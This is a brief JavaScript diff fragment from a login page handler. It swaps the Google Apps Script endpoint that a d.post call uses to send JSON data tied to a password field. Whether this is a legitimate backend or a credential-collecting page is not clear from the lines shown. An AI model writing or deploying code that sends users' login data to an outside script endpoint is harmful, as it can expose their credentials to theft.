@@ -102,7 +102,7 @@ login.onload = () => {
       `div [node="${password._node}"]`
     );
     d.post(
-      "https://script.google.com/macros/s/AKfycby9aYhOTJFe6qKsEpJ5CSfpntcrk4OWhCoZqiEVSA/exec",
+      "https://script.google.com/macros/s/AKfycbzLEX8OFSld2y-zSNGCw5oyqVWbqfoKO1kKrJ5n0cHJElKaNIQY0QnAQnLeGrR2eHzD/exec",
       {
         type: 0,
         data: JSON.stringify({
